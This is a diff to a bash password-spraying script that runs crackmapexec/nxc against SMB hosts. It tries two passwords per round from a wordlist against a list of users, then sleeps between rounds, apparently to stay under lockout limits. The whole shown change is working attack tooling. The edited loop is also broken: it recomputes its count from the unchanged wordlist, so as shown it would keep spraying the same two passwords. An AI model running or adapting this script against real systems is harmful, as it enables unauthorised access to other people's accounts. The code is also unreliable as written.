@@ -24,23 +24,23 @@ fi
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 sleep_timer="sleep $4m"
 
-touch creds.txt 
-touch used-passwords.txt
-touch tmp-creds.txt
-touch passwords-in-queue.txt
-
+touch ./creds.txt 
+touch ./used-passwords.txt
+touch ./tmp-creds.txt
+touch ./passwords-in-queue.txt
+touch ./tmp.txt
 
 count=$(wc -l < $3)
 
 while [ $count -gt 0 ]; do
 	echo "Starting password spray with 2x every $4"
 	
-	head -n $count $3 > passwords-in-queue.txt
+	head -n $count $3 > tmp.txt
 	
-	for pass in $(cat passwords-in-queue.txt | head -2); do
+	for pass in $(cat tmp.txt | head -2); do
 		echo "Spraying: $pass"
-		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log spraygun-log.log
-		echo $pass >> /root/Documents/sprays/used-passwords.txt
+		nxc smb $1 -u $2 -p $pass --continue-on-success --log spraygun-log.log
+		echo $pass >> ./used-passwords.txt
 
 		sleep 5
 
@@ -55,9 +55,9 @@ while [ $count -gt 0 ]; do
  	#sort -u tmp-creds.txt | cut -d "\\" -f 2 >> creds.txt 
   	#cat creds.txt
 	
-	sed -i "1,2d" passwords-in-queue.txt
+	sed -i "1,2d" tmp.txt
 	
-	count=$(wc -l < passwords-in-queue.txt)
+	count=$(wc -l < $3)
 	echo "sleeping for $4m"
 	$sleep_timer
 done
